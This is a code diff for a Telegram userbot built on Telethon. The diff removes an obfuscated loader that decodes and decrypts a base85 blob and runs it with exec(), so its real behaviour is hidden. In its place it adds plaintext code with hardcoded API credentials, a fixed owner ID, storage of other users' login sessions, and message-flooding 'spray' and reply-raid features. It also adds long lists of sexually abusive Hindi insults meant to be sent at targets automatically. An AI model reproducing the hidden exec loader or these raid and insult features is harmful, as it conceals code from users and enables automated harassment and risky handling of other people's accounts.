-    "!{tE$c0T&=JVHL}Ug(F+bf8Rd)ZNRTu{<jC6zmwk@YWI?go6hy(aL8{`D$>9MEUDrey(r5;I(;dLq8SD"
-    "#hIYa!%>G0!})^Ew*bw-PGaBNz<+Wo_yl6m%}H5?ZyN7E%RqE0=(4KAsQ3ic7`c6)l%tEgo72{e1{#Ed"
-    "8l9sT8n5+=6>nLUHCc;8Y61X>^6_yuFqkw5ldyB8Pa@u;+UMv53}Sr8gG7l;X}ru`sOSOhvcgrb554Y0"
-    "#9@$iSXeOq>y@Ra1ieNLea`YmMd8D5FIxbPT0eVMsaxr@S|hilOCnyh?7nI@h=p*DCDx8!65q-o2@CO0"
-    ";~t8@LhA$SS6gC2R<+rW$Zek8Eius3)<bBW{G>s%lr46VzzNTL?B|if*+0e3RFMhZYMvC^*ciUL|B^2<"
-    "EZGfbeE7^t2XkwC`va0vc%xwtj9_I(zf-E690g&)hTv?O5`rzd!*FKr?RvsXJ01`Op#Cxvr^tj+xL*I_"
-    "l>j7arWV(g93$5%riLd3%J4=vTGgy5&+yzD3{qBk3x|H8SE`4D^zvDZ>IoHHi{+nxx>bsO+u9w4a=ORl"
-    "JO29I1R@8H$p0l6HhBbpWU)nW-Y`|xKWTcHcu%ULip2&3oWab4ySx_6n1(M<02)KS*|RX)jWB=UgN*eQ"
-    "L^77?3YlUzI-*XW(d{rpCJq40gnKtiD4Ay)q2!R{K(6OF)nL^G)VZ@BXoX>1J)NZCu2XOhl{t6o=@{mh"
-    "g31Tx$)t;(wwo=AdZ1OhsI{2?0x6*teg4UB1s+a!)&l)MnCGlGFQafiu$_|fI9fkFASHxg`l*Cy$`k{N"
-    "UOFZOlwgEX(r6JDT}imleA<zBrjz=MF!&c>TXu+Y`J!Hwpx6FKEbFt{Ooz-w$}s2eC~~oQa9(JAQD5^k"
-    "qqDY1{c2Byw=h8Oxev`dXVjgnJdFPlp2_FXXrE7?Z0};sikzbf>{Q)VeoJYP;U}LT+1~wbH*N5Qbb_F9"
-    "Aa5J`C>_wm{Gdt1;{c_5vUgYj>V?fPi#4WqVNLI+#viix&+cv~d11Aj76o(|@`E|Im6tO0mV<j9Y_5_i"
-    "g4=k<Eu&=bfal;&f)JmQZ`E+B$%F%RvW1F@N$icf34z~Nr%MGr%Cq{-WyJF6?AR~geOL)D_nkwJlDtGY"
-    ")BFp0+--IJHPx||QZd>RYtL2vsHM&Ae(f_Mz9qAnW+VPwY;nrx))78>*$yjUMnA#)d6XcXDw^pX91fDB"
-    "%Q*x#IJL5wGd_m>G+&7zg(|m#(iYgZ=SzK<-p6~KO)k%u<##XF85ZC9$G+8TPFv3;<I1tzTwdp|FB!Q-"
-    "%cMW>Fq31ra4cq=%$)GU#Dq!Ft1_k)!(q0DUrxO#j1qn%xL+?R1SD>^Rw32E@32Z8=W$QEzl;K!hR8pV"
-    "y1F&&8!Sq*pkb8{wUPaw_$wiQR=F48c2}ejAM8EbqvyZg9Y*B~L{>O(+RUy0?+TH*c5JxB9Yi`EDbgYd"
-    "`41@nIgA6hfc|2H6%oExnFdmm5srC>s4fPsz?yn1hxexoB!GnIz|Lt;pw)y%otocFsUZf2@q1u4mu%on"
-    "tST!*js9@x56W8#RzzU~*E%`+TQjVSRzFdgIhJ4%@h;OtD-RG*$aPEBg2t<wX57U&6O-ioq`Od!N1E1j"
-    "dJ&`W81EnifOSDRyU&)Xm;T7iS?$%5@_N7yRRbZ``h`Xx+@Tq#Y!VJDk2ylRmyN1Vl$DK?6Yn<8T!}dm"
-    "9KgBK<sNC!IK0VH`gO3<2O5jW6Qd7N$|PoXo?bV!`3wlVp?`*#-?t~CM|f+GDRsga<mG@%&Zs_$0I#%k"
-    "9Me>j%y*)P;c;cy36c@;K{0#ci1&WGndyc$3yeRQ@6(gZ^`!<zvAE?__V?~<q60w&K6|0Temr&sSK%^="
-    "*qCa4owY$GPg5&vk<SJe*zU$DfB;j?)dzCP#9W&!Md1_AOXzB4PTD_>aalw7D!qqMb@0zpuD_APTk|iq"
-    "PabZ=6^TLP(mLrA6AHMpy#2%`rTUN%iX7P1_;sEXuS7BsutMo_*;Qhfb9-O!UeD`uvC(y=CD_}|HNmbu"
-    "N>3{?*%E^SgHPG1hCho9-;YfRjUSUSExszWwl;ZbI2ZG9Ga!VrQ^$LfAOZ|s+f>S&rGbXI1tE7gLb@>o"
-    "Rz{UGRw8fr@bgt?>nf~VkRuloL!@R}k#uebp-B@w#nSs3N!*Ay9m&C5Osd9E1jS@|-M^(AaPiAYsly)_"
-    ">EafB;}-#M<Ye;u0SW7ww+gyRDY?*YwNCy~#Y~Hm`Kmp&C8-n~^tC8l1o!W1EDEq6cxyfD?)<OH-77+S"
-    "^%y)FGCOwmExnte^s3=!7K>9v&pDQCNoQlH+ENdwEctf}j~Q2C*G0EV5<!`HFMLu`i9N}Xw-Msk8^!ky"
-    "ra=XT8W5@jakHbzM~N)mMZRRqIX|(9VWJxq;;ttSFzGO+G=;2}EavYN0?v%v8UcsH-iwM6!P>Lf#y3k("
-    "`?rsx<|KbqYrIG;&byxz0mq%}uJBcdM<axsGO{1?FSeDfp(+VHRj+`&(wH|Ak%ZXn>jk>HHzXo1B+>V4"
-    "Z%P-F!X|zTpdZCB8HOUX4-gTZAEcOuVI{o9CiUX8>L(kdHNW#jNGeR|s(WEF;e)_aB*0y+h*DVHH*%7i"
-    "Lxca8gHgI>;}KEo;A-(Re+$3z0~Ddp<|!OaZF|^RybI+&iA_7Q^wqeA*qo;7Kd<_DknRo~oF)e?7}Is2"
-    "=cuSPPzFIsgRPaoP_Vq3HNBC;zHg_^9prB-OST9Exmay`Z2nqOxG*w#s>L(7fZCPqYS|`%U!EgL6Det8"
-    "NgYe!F?!snT(qWoG(Z%FIV!f)m!evuU<yo*d4HM7+AK$m#?;eUhx-Mxyzf;Q;8JMwEx27zWSO+60M(?r"
-    "4fXHabVjE0v^mVGjJlU*2-s4_9~I}a>xvBc86J?}Zq@N9qUFS7#{;n<{%n9UNHvIP*s>td(px46C8NNF"
-    "?`Bx6SlMd#eLhAJq5{g>A`bW7oR_H((bxan+hbwQx&J~&0n|&RvDuKSNmT;C@(O-`Q}7&Nu2o{Cm|A?5"
-    "BQuhJbHb%B3eZ>=9MFDO<Ye~s|E?dRgj1wTVz07;oT1{k8y0lFCz35*?QQ&sNm=l?)V5H2WVgM5@ih$N"
-    "Rk|dq5U>P<#*3`~c$T=#_KK$7S2^c)zcAjFTRXnzDy#IriE9^qjZ(8qE*2cSAtgG?0u*MsgzXl6dha1|"
-    "Yajo`0Yc&q-5r;s12UzmB~_fPp!GARgHA7g+4gy0)9pWXaJeu$YFDqMeYmg1(Y5Fdd6Ka$hJhhy^1r|8"
-    "!a!tdXQ_^XIXSbF#)UR5>5~CMmH=h}ccu5M)eQx${myMo^XStesp_>7E^V9$y&t6TJ&QZHr+<F;13DqU"
-    "|8ZakA9@BKxFFn$c4yG3{+BHw@01!O?cYfu7QV;BW7YN@(Bvp3;_A&GprQcqqd!1V2*|NiM4%Myi-ce*"
-    "J;zlH#E+zXroeNJNW&yMMO2tqXef<DBx?iu=^+<073c$ew~cNt(r|D$%sAaR%%0duASixjrai?(WPK`l"
-    "J~SjZ#dYLo*_Cd8XDBa{W<YJ@4jUGc+c>hdqoxunO6XP>Dt8y>n6W6Nq)i795TBx4d@O5{>>uIS${Pk1"
-    "bSIJND0AHN?s3~@ZNTo$M!@*NB?H{w>E_utFn_+}1)aU-9);spp%ST|76-VVu9c;zt%8s{4?;OLz<M($"
-    "fO&}zXMw=;_Epzusz)(A7|E(ZpvH_4ulj~07ScJ)4yR?0;E~+)hSuB7M6W8WG7Q&u5P9JD0mZWr_^Ptv"
-    ";j;UiuEs|OSSN-FJ=VGKY4kz~22y7u;{cc}+CUp<*yivK;2gv9sbU~3vWw>Se@V5A1+0s$2L(`-LB=Ml"
-    "sgwQ%Z`~D(k(?j#S8j54@>vQw=nn^rV0*O&b~Sz?<bEurfortg-T%O3!~U)(JUc}=ArFpC6ww)}NUCUG"
-    "bu{JQy*Z|+yP<QgH$#wvn>>DC{$h0%N>$s`aipplKe8G~UA#jF!h2fUx%MTDxF~<*skZ38H0<q=-Rbj$"
-    "*_v%O3I))5I&^MZghAZnzuj-+Wf+Fe)V%cW0GSo-D#D<%rC!=!wysJy$$~AhM-+r2GzIo<<KRdFV}lp@"
-    "rMPhVb7{f<t}geEOaXZ{?jV?9MQO!9BL3W#^gF!FBK_HhgG&rT!&<7X*D-yWA9Eq7K3`e5nCR5F_&kdJ"
-    ";Cw=NfAudUHt!HbDZL2t#);1+ItdiB&|dV~F*7h(={PZG<j;1@u!3@o2mJP`_B*bBbzhk<(fBVMa-{aK"
-    ">#AonT{lFa%<2D@hz3f5PK&UJ$h#^_W1G(ec8#}AL{-t~8@VDVO9Fu%<V&&lKzr$gdbyDxf_k368xn%e"
-    "3vT39te0T+wb11"
-)
-
-def _0x_BootstrapRuntime():
+def _ensure_telethon():
     try:
-        _0x_raw_stream = _base64.b85decode(_0x_BYTE_STREAM.encode("ascii"))
-        _0x_deciphered = bytes([
-            _0x_b ^ _0x_SECURITY_CIPHER[_0x_i % len(_0x_SECURITY_CIPHER)]
-            for _0x_i, _0x_b in enumerate(_0x_raw_stream)
-        ])
-        _0x_source_code = _zlib.decompress(_0x_deciphered).decode("utf-8")
-        _0x_exec_scope = globals()
-        
-        # Pass user configurations from the top of file into runtime
-        _0x_exec_scope["_OUTER_API_ID"] = globals().get("API_ID", 32939383)
-        _0x_exec_scope["_OUTER_API_HASH"] = globals().get("API_HASH", "f9afe5e97b369160188b59954fa2482c")
-        _0x_exec_scope["_OUTER_BOT_TOKEN"] = globals().get("BOT_TOKEN", "").strip()
-        _0x_exec_scope["API_ID"] = _0x_exec_scope["_OUTER_API_ID"]
-        _0x_exec_scope["API_HASH"] = _0x_exec_scope["_OUTER_API_HASH"]
-        _0x_exec_scope["BOT_TOKEN"] = _0x_exec_scope["_OUTER_BOT_TOKEN"]
-        
-        _0x_code_obj = compile(_0x_source_code, "<ChampuUserbotRuntime>", "exec")
-        exec(_0x_code_obj, _0x_exec_scope)
-    except Exception as _0x_err:
-        print(f"\n❌ [Runtime Critical] Failed to initialize engine: {_0x_err}")
+        import pyaes, rsa, telethon  # noqa
+        return
+    except ImportError:
+        pass
+    print("[SETUP] telethon/pyaes install ho raha hai...")
+    cmd = [_sys.executable, "-m", "pip", "install", "--no-deps", "--quiet",
+           "--disable-pip-version-check", "--target", _LIBS,
+           "telethon", "pyaes", "rsa", "pyasn1"]
+    try:
+        _sp.check_call(cmd, env={k: v for k, v in _os.environ.items()
+                                 if k not in ("PIP_NO_INDEX", "PIP_FIND_LINKS")})
+    except Exception as _e:
+        print(f"[SETUP ERROR] Install fail: {_e}")
         _sys.exit(1)
 
-if __name__ == "__main__" or True:
-    _0x_BootstrapRuntime()
+def _ensure_others():
+    need = []
+    for _mod, _pkg in (("requests", "requests"), ("aiohttp", "aiohttp"),
+                       ("qrcode", "qrcode"), ("PIL", "pillow"),
+                       ("gtts", "gTTS"), ("yt_dlp", "yt-dlp")):
+        try:
+            __import__(_mod)
+        except ImportError:
+            need.append(_pkg)
+    if not need:
+        return
+    print(f"[SETUP] install ho raha hai: {', '.join(need)}")
+    cmd = [_sys.executable, "-m", "pip", "install", "--quiet",
+           "--disable-pip-version-check", "--target", _LIBS] + need
+    try:
+        _sp.check_call(cmd, env={k: v for k, v in _os.environ.items()
+                                 if k not in ("PIP_NO_INDEX", "PIP_FIND_LINKS")})
+    except Exception as _e:
+        print(f"[SETUP ERROR] Install fail: {_e}")
+        _sys.exit(1)
+
+_ensure_telethon()
+_ensure_others()
+
+#BY YORICHI & TheChampu
+
+# ────────────────────────────────────────────────
+#                 STANDARD LIB
+# ────────────────────────────────────────────────
+import asyncio
+import os
+import time
+import json
+import random
+import logging
+logging.getLogger("telethon").setLevel(logging.CRITICAL)  # connection-reset spam band
+import traceback
+import re
+from datetime import datetime, timedelta, timezone
+from typing import Dict, Set, Optional
+from io import BytesIO
+
+# ────────────────────────────────────────────────
+#                 THIRD PARTY
+# ────────────────────────────────────────────────
+import requests
+import qrcode
+from gtts import gTTS
+import yt_dlp
+
+# ────────────────────────────────────────────────
+#                 TELETHON
+# ────────────────────────────────────────────────
+from telethon import TelegramClient, events, functions, types
+# Newer telethon versions expose a different `types`/`functions`; force the raw TL ones
+from telethon.tl import types, functions
+from telethon import Button
+from telethon.errors import (
+    FloodWaitError, RPCError,
+    SessionPasswordNeededError, PhoneCodeInvalidError,
+    PhoneCodeExpiredError, PasswordHashInvalidError
+)
+from telethon.sessions import StringSession
+import contextvars
+
+# ────────────────────────────────────────────────
+#                 BASIC PATH SETUP
+# ────────────────────────────────────────────────
+BASE_DIR = os.getcwd()
+
+DOWNLOAD_PATH = os.path.join(BASE_DIR, "downloads")
+os.makedirs(DOWNLOAD_PATH, exist_ok=True)
+
+TEMP_PATH = os.path.join(BASE_DIR, "temp")
+os.makedirs(TEMP_PATH, exist_ok=True)
+
+# ────────────────────────────────────────────────
+#                 USERBOT & BOT CONFIG
+# ────────────────────────────────────────────────
+# ────────────────────────────────────────────────
+#                 DYNAMIC CONFIGURATION
+# ────────────────────────────────────────────────
+try:
+    _raw_api_id = globals().get("_OUTER_API_ID") or globals().get("API_ID") or 35372184
+    API_ID = int(_raw_api_id)
+except Exception:
+    API_ID = 35372184
+
+API_HASH = "f50bff5d1b5c1e9bda29e3ad8f190903"
+BOT_TOKEN = str(globals().get("_OUTER_BOT_TOKEN") or globals().get("BOT_TOKEN") or "").strip()
+
+# ⭐ Master Owner Telegram User ID
+OWNER_ID = 7839813581
+SESSION = "itsMyUserbot"
+
+# ────────────────────────────────────────────────
+#           MULTI-CLIENT PROXY ENGINE
+# ────────────────────────────────────────────────
+current_client_var: contextvars.ContextVar[Optional[TelegramClient]] = contextvars.ContextVar("current_client", default=None)
+ACTIVE_CLIENTS: Dict[int, TelegramClient] = {}
+primary_client: Optional[TelegramClient] = None
+
+class TelethonClientProxy:
+    def __getattr__(self, name):
+        cl = current_client_var.get()
+        if cl is None:
+            cl = primary_client
+        if cl is None and ACTIVE_CLIENTS:
+            cl = next(iter(ACTIVE_CLIENTS.values()))
+        if cl is None:
+            raise RuntimeError("No active userbot client available")
+        return getattr(cl, name)
+
+    def __call__(self, *args, **kwargs):
+        cl = current_client_var.get()
+        if cl is None:
+            cl = primary_client
+        if cl is None and ACTIVE_CLIENTS:
+            cl = next(iter(ACTIVE_CLIENTS.values()))
+        if cl is None:
+            raise RuntimeError("No active userbot client available")
+        return cl(*args, **kwargs)
+
+# Universal client proxy used by all 50+ userbot commands
+bot = TelethonClientProxy()
+
+# Manager bot client (started with BOT_TOKEN)
+manager_bot = TelegramClient(
+    StringSession(),
+    API_ID,
+    API_HASH,
+    auto_reconnect=True,
+    connection_retries=10,
+    retry_delay=3,
+)
+
+# Multi-user sessions directory & storage
+SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
+os.makedirs(SESSIONS_DIR, exist_ok=True)
+USERS_DB_FILE = os.path.join(SESSIONS_DIR, "users.json")
+
+def load_saved_users() -> dict:
+    if not os.path.isfile(USERS_DB_FILE):
+        return {}
+    try:
+        with open(USERS_DB_FILE, "r", encoding="utf-8") as f:
+            data = json.load(f)
+            return data if isinstance(data, dict) else {}
+    except Exception:
+        return {}
+
+def save_user_session(uid: int, data: dict):
+    try:
+        users = load_saved_users()
+        users[str(uid)] = data
+        with open(USERS_DB_FILE, "w", encoding="utf-8") as f:
+            json.dump(users, f, indent=2, ensure_ascii=False)
+    except Exception as e:
+        print(f"[SAVE USER SESSION ERROR] {e}")
+
+def remove_user_session(uid: int):
+    try:
+        users = load_saved_users()
+        users.pop(str(uid), None)
+        with open(USERS_DB_FILE, "w", encoding="utf-8") as f:
+            json.dump(users, f, indent=2, ensure_ascii=False)
+    except Exception as e:
+        print(f"[REMOVE USER SESSION ERROR] {e}")
+
+# ────────────────────────────────────────────────
+#                 STORAGE FILES
+# ────────────────────────────────────────────────
+ADMINS_FILE = "admins.json"
+NOTES_FILE = "notes.json"
+BANNER_FILE = "banner_msg_id.txt"
+
+# ────────────────────────────────────────────────
+#                 CLONE ENGINE STATE
+# ────────────────────────────────────────────────
+CLONE_ACTIVE: bool = False
+LAST_CLONE_ID: Optional[int] = None
+
+CLONE_DATA: Dict[str, Optional[object]] = {
+    "name": None,
+    "username": None,
+    "bio": None,
+    "photo_bytes": None,
+}
+
+# ────────────────────────────────────────────────
+#                 RUNTIME STATE
+# ────────────────────────────────────────────────
+admins: Set[int] = set()
+notes: Dict[int, str] = {}
+
+menu_banner_msg: Optional[tuple] = None
+auto_react_emoji: Optional[str] = None
+
+muted_users: Set[int] = set()
+global_muted: Set[int] = set()
+
+reply_users: Set[int] = set()
+rr_users: Set[int] = set()
+flag_users: Set[int] = set()
+hrr_users: Set[int] = set()
+replygod_users: Set[int] = set()
+
+replyyorichi_users: Dict[int, Dict[str, object]] = {}
+
+spray_tasks: Dict[int, asyncio.Task] = {}
+
+group_locks: Set[int] = set()
+
+START_TIME = time.time()
+
+SPRAY_DELAY = 5
+
+# ────────────────────────────────────────────────
+#                 BOT ADD ENGINE
+# ────────────────────────────────────────────────
+ADD_BOTS_LIST = [
+]
+
+# ────────────────────────────────────────────────
+#                 FASTGC ENGINE STATE
+# ────────────────────────────────────────────────
+FASTGC_STATE: Dict[str, Optional[object]] = {
+    "active": False,
+    "template": None,
+    "task": None,
+    "chat_id": None,
+}
+
+GC_FAST_INTERVAL = 1
+
+GC_FAST_EMOJIS = [
+    "❤️","🧡","💛","💚","💙","💜",
+    "🖤","🤍","🤎","🩷","🩵","🩶",
+    "💖","💘","💝","💗","💓","💞",
+    "💕","💟","❣️","❤️‍🔥","❤️‍🩹"
+]
+
+# ────────────────────────────────────────────────
+#                   HELPERS
+# ────────────────────────────────────────────────
+# ================= ADMIN STORAGE =================
+
+def load_admins():
+    global admins
+    try:
+        if not os.path.isfile(ADMINS_FILE):
+            admins = set()
+            return
+
+        with open(ADMINS_FILE, "r", encoding="utf-8") as f:
+            data = json.load(f)
+
+        clean = set()
+
+        if isinstance(data, list):
+            for x in data:
+                try:
+                    clean.add(int(x))
+                except:
+                    continue
+
+        admins = clean
+
+    except Exception as e:
+        print(f"[LOAD ADMINS ERROR] {str(e)[:80]}")
+        admins = set()
+
+
+def save_admins():
+    try:
+        tmp = sorted(set(int(x) for x in admins))
+        with open(ADMINS_FILE, "w", encoding="utf-8") as f:
+            json.dump(tmp, f, indent=2)
+    except Exception as e:
+        print(f"[SAVE ADMINS ERROR] {str(e)[:80]}")
+
+
+def is_admin(uid: int) -> bool:
+    if not uid:
+        return False
+    return uid == OWNER_ID or uid in admins
+
+
+# ================= SAFE EDIT =================
+
+async def safe_edit(event, text: str):
+
+    if not text:
+        return
+
+    try:
+        return await event.edit(text)
+
+    except Exception:
+
+        try:
+            msg = await event.reply(text)
+        except:
+            return
+
+        try:
+            if event.out:
+                await event.delete()
+        except:
+            pass
+
+        return msg
+
+
+# ================= NOTES STORAGE =================
+
+def load_notes():
+    global notes
+    try:
+        if not os.path.isfile(NOTES_FILE):
+            notes = {}
+            return
+
+        with open(NOTES_FILE, "r", encoding="utf-8") as f:
+            raw = json.load(f)
+
+        clean = {}
+
+        if isinstance(raw, dict):
+            for k, v in raw.items():
+                try:
+                    clean[int(k)] = str(v)
+                except:
+                    continue
+
+        notes = clean
+
+    except Exception as e:
+        print(f"[LOAD NOTES ERROR] {str(e)[:80]}")
+        notes = {}
+
+
+def save_notes():
+    try:
+        with open(NOTES_FILE, "w", encoding="utf-8") as f:
+            json.dump(notes, f, ensure_ascii=False, indent=2)
+    except Exception as e:
+        print(f"[SAVE NOTES ERROR] {str(e)[:80]}")
+
+
+# ================= MENU BANNER STORAGE =================
+
+def load_banner():
+    global menu_banner_msg
+    try:
+        if not os.path.isfile(BANNER_FILE):
+            menu_banner_msg = None
+            return
+
+        with open(BANNER_FILE, "r", encoding="utf-8") as f:
+            raw = f.read().strip()
+
+        if ":" not in raw:
+            menu_banner_msg = None
+            return
+
+        chat, msg = raw.split(":", 1)
+
+        menu_banner_msg = (int(chat), int(msg))
+
+    except Exception as e:
+        print(f"[LOAD BANNER ERROR] {str(e)[:80]}")
+        menu_banner_msg = None
+
+
+def save_banner():
+    try:
+        if not menu_banner_msg:
+            if os.path.isfile(BANNER_FILE):
+                os.remove(BANNER_FILE)
+            return
+
+        with open(BANNER_FILE, "w", encoding="utf-8") as f:
+            f.write(f"{menu_banner_msg[0]}:{menu_banner_msg[1]}")
+
+    except Exception as e:
+        print(f"[SAVE BANNER ERROR] {str(e)[:80]}")
+
+
+# ───── UNIVERSAL TARGET RESOLVER ─────
+async def get_targets(event, arg: str = "") -> Set[int]:
+
+    targets: Set[int] = set()
+
+    # ⭐ reply resolver
+    if event.is_reply:
+        try:
+            reply = await event.get_reply_message()
+            if reply and reply.sender_id:
+                targets.add(int(reply.sender_id))
+        except:
+            pass
+
+    # ⭐ argument resolver
+    if arg:
+        for part in arg.strip().split():
+
+            if not part:
+                continue
+
+            if part.isdigit():
+                try:
+                    targets.add(int(part))
+                    continue
+                except:
+                    pass
+
+            try:
+                ent = await bot.get_entity(part)
+                if ent and getattr(ent, "id", None):
+                    targets.add(int(ent.id))
+            except:
+                pass
+
+    # ⭐ self protection
+    try:
+        me = await bot.get_me()
+        targets.discard(me.id)
+    except:
+        pass
+
+    return targets
+
+
+# ⭐ INITIAL LOAD
+load_admins()
+load_notes()
+load_banner()
+# ────────────────────────────────────────────────
+#                   TEXT LISTS (Unchanged)
+# ────────────────────────────────────────────────
+reply_list = ["𝐊ʏᴀ 𝐑ᴇ 𝐑ᴀɴᴅɪᴋᴇ 𝐂ᴏᴏʟ 𝐁ᴀɴᴇɢᴀ 𝐓ᴜ 𝐂ʜᴀʟ 𝐀ʙ 𝐂ʜᴜᴅ 𝐀ᴘɴᴇ 𝐁ᴀᴀᴘ 𝐂ʜᴀᴍᴘᴜ 𝐒ᴇ - 🦢💘",
+    "𝐊ɪ 𝐌ᴀᴀ 𝐌ᴀʀʀ 𝐆ᴀʏɪ 𝐘ᴀᴀʀ - 𝐉ᴀɪ 𝐂ʜᴀᴍᴘᴜ ! 🌙",
+    "acha beta 😂🔥👊🏻 ? coi na me toh HATER codunga 😹💔🔥😆👊🏻💥",
+    "chudke bhaga kaise 😂💥🤣🤘🏻",
+    "ne toh 𝐂ʜᴀᴍᴘᴜ ka lun muh me lelia 😂🙏🏻😂🙏🏻",
+    "try maa सूर्य☀ nikalte hi pel du 😹🔥💔",
+    "mkl lun te vaj 😂✊🏻💦",
+    "𝗧ᴍᴋ𝗕 pe 𝐂ʜᴀᴍᴘᴜ ka hamla 😂⚔🔥💥",
+    "𝐂ʜʟ 𝐇ᴀʀᴍᴢᴀᴅ𝐈 𝐊ᴇ लड़के 💛🤍🩵",
+    "oi 𝐓ᴇʀɪ 𝐌‌ᴀᴀ गुलाम ₰🖤",
+    "chl rndyce chud ke dikha 😂💥🤣🔥",
+    "𝐊ɪ 𝐌ᴀᴀ 𝐌ᴀʀʀ 𝐆ᴀʏɪ naacho 💃🏻💃🏻🕺🏻🎶😂😆💞🔥 !",
+    "tera baap bass 𝐂ʜᴀᴍᴘᴜ hai 😂🎀",
+    " try maa hagte hue paad mari -#😹🔥🥀",
+    "  𝐓ᴇʀɪ 𝐌ᴜᴍᴍʏ 𝐂ʜᴏᴅ 𝐃ɪ 𝐂ʜᴀᴍᴘᴜ 𝐍ᴇ 𝐁ᴡᴀʜᴀʜᴀʜᴀ ⚜","𝐊ʏᴀ 𝐑ᴇ 𝐑ᴀɴᴅɪᴋᴇ 𝐂ᴏᴏʟ 𝐁ᴀɴᴇɢᴀ 𝐓ᴜ 𝐂ʜᴀʟ 𝐀ʙ 𝐂ʜᴜᴅ 𝐀ᴘɴᴇ 𝐁ᴀᴀᴘ 𝐂ʜᴀᴍᴘᴜ 𝐒ᴇ - 🦢💘",
+    "𝐊ɪ 𝐌ᴀᴀ 𝐌ᴀʀʀ 𝐆ᴀʏɪ 𝐘ᴀᴀʀ - 𝐉ᴀɪ 𝐂ʜᴀᴍᴘᴜ ! 🌙",
+    "acha beta 😂🔥👊🏻 ? coi na me toh HATER codunga 😹💔🔥😆👊🏻💥",
+    "chudke bhaga kaise 😂💥🤣🤘🏻",
+    "ne toh 𝐂ʜᴀᴍᴘᴜ ka lun muh me lelia 😂🙏🏻😂🙏🏻",
+    "try maa सूर्य☀ nikalte hi pel du 😹🔥💔",
+    "mkl lun te vaj 😂✊🏻💦",
+    "𝗧ᴍᴋ𝗕 pe 𝐂ʜᴀᴍᴘᴜ ka hamla 😂⚔🔥💥",
+    "𝐂ʜʟ 𝐇ᴀʀᴍᴢᴀᴅ𝐈 𝐊ᴇ लड़के 💛🤍🩵",
+    "oi 𝐓ᴇʀɪ 𝐌‌ᴀᴀ गुलाम ₰🖤",
+    "chl rndyce chud ke dikha 😂💥🤣🔥",
+    "𝐊ɪ 𝐌ᴀᴀ 𝐌ᴀʀʀ 𝐆ᴀʏɪ naacho 💃🏻💃🏻🕺🏻🎶😂😆💞🔥 !",
+    "tera baap bass 𝐂ʜᴀᴍᴘᴜ hai 😂🎀",
+    " try maa hagte hue paad mari -#😹🔥🥀",
+    "  𝐓ᴇʀɪ 𝐌ᴜᴍᴍʏ 𝐂ʜᴏᴅ 𝐃ɪ 𝐂ʜᴀᴍᴘᴜ 𝐍ᴇ 𝐁ᴡᴀʜᴀʜᴀʜᴀ ⚜"]
+
+reply_texts = ["⋆｡ﾟ☁︎｡𝐂ʏᴜ 𝐑ᴇ मदरचोद 𝐂ʜᴀᴍᴘᴜ बाप के सामने 𝐅ʏᴛᴇʀ 𝐁ᴀɴᴇɢᴀ ⋆𓂃 ོ☼𓂃 😂🔥",
+"नहीं नहीं तेरी मां को 𝐒ɪʀғ 𝐂ʜᴀᴍᴘᴜ बाप चोद सकता है ִֶָ𓂃 ࣪ ִֶָ👑་༘࿐ sᴀᴍᴊʜᴀ ʀᴀɴᴅɪᴋᴇ ???",
+"तेरी मां का 𝐒ᴛʏʟɪsʜ भोसड़ा 😱",
+"𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
+"सोच तेरी बहन को 𝐂ʜᴀᴍᴘᴜ बाप का गुलाम चोद रहा 😎🔥",
+"Hello hello?? Oxygen aarahi है? रण्डी पुत्र 🧘🏻",
+"Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन 𝐂ʜᴀᴍᴘᴜ /\\~ 👑 बाप से सही chudi 🥵🔥",
+"ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ 𝐂ʜᴀᴍᴘᴜ बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
+"🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके MOAN करती है ! 🛐","⋆｡ﾟ☁︎｡𝐂ʏᴜ 𝐑ᴇ मदरचोद 𝐂ʜᴀᴍᴘᴜ बाप के सामने 𝐅ʏᴛᴇʀ 𝐁ᴀɴᴇɢᴀ ⋆𓂃 ོ☼𓂃 😂🔥",
+"नहीं नहीं तेरी मां को 𝐒ɪʀғ 𝐂ʜᴀᴍᴘᴜ बाप चोद सकता है ִֶָ𓂃 ࣪ ִֶָ👑་༘࿐ sᴀᴍᴊʜᴀ ʀᴀɴᴅɪᴋᴇ ???",
+"तेरी मां का 𝐒ᴛʏʟɪsʜ भोसड़ा 😱",
+"𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
+"सोच तेरी बहन को 𝐂ʜᴀᴍᴘᴜ बाप का गुलाम चोद रहा 😎🔥",
+"Hello hello?? Oxygen aarahi है? रण्डी पुत्र 🧘🏻",
+"Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन 𝐂ʜᴀᴍᴘᴜ /\\~ 👑 बाप से सही chudi 🥵🔥",
+"ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ 𝐂ʜᴀᴍᴘᴜ बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
+"🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके MOAN करती है ! 🛐","⋆｡ﾟ☁︎｡𝐂ʏᴜ 𝐑ᴇ मदरचोद 𝐂ʜᴀᴍᴘᴜ बाप के सामने 𝐅ʏᴛᴇʀ 𝐁ᴀɴᴇɢᴀ ⋆𓂃 ོ☼𓂃 😂🔥",
+"नहीं नहीं तेरी मां को 𝐒ɪʀғ 𝐂ʜᴀᴍᴘᴜ बाप चोद सकता है ִֶָ𓂃 ࣪ ִֶָ👑་༘࿐ sᴀᴍᴊʜᴀ ʀᴀɴᴅɪᴋᴇ ???",
